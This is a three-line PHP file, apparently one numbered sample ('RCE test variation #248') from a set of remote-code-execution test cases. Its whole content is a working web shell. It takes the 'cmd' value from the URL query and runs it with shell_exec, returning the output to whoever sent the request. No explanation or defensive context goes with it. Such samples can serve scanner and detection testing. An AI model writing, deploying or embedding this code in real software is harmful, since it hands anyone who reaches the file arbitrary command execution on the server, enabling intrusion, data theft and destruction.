<?php
// RCE test variation #248
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>